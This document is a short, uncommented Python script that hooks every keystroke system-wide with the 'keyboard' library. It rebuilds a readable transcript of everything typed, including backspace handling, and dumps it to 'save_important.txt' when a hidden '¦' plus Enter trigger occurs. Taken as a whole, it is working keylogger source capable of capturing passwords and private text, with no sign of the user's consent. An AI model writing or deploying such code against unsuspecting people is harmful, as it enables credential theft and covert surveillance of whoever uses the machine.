import keyboard
import os

class handler():
    running = True
    text = ""
    wtext = ""
    words = []
    entries = []
    beautiful_text = ""
    clear = lambda self: os.system('cls')

    def on_key_event(self,event):
        n = event.name
        if event.event_type != "up":
            self.text += f"{n}&%<"
            if len(list(n)) <= 1 or n == "space":
                self.wtext += f"&%<{n}&%<"
            if len(list(n)) <= 1:
                self.beautiful_text += n
            if n == "space":
                self.beautiful_text += " "
            if n == "enter":
                self.beautiful_text += "\n"
            if n == "tab":
                 self.beautiful_text += "\t"
            if n == "backspace":
                self.beautiful_text = self.beautiful_text[:-1]
            if n == "enter" and self.text[-12] == "¦":
                self.save_file()
                self.running = False
                
    def check_running(self,x):
         return self.running
    
    def beautify(self):
        self.entries = self.text.split("&%<")
        self.words = self.wtext.split("space")
        self.entries = str(self.text.split("space")).replace('"',"").replace("[","").replace("]","").replace("'","").split("enter")
        w = []
        for i in self.words:
                w.append(i.replace("&%<",""))
        self.words = w 
        e = []
        for i in self.entries:
                i = i.replace("&%<","")
                if len(list(i)) <= 50:
                     e.append(i)
        self.entries = e 

    def save_file(self):
        self.beautify()
        with open("save_important.txt","w") as f:
             f.write(f"text={self.text}\nwords={self.words}\nenters={self.entries}\nb_text={self.beautiful_text}")
             
hndl = handler()
keyboard.hook(hndl.on_key_event) 
keyboard.hook(hndl.check_running)
while hndl.running:
    pass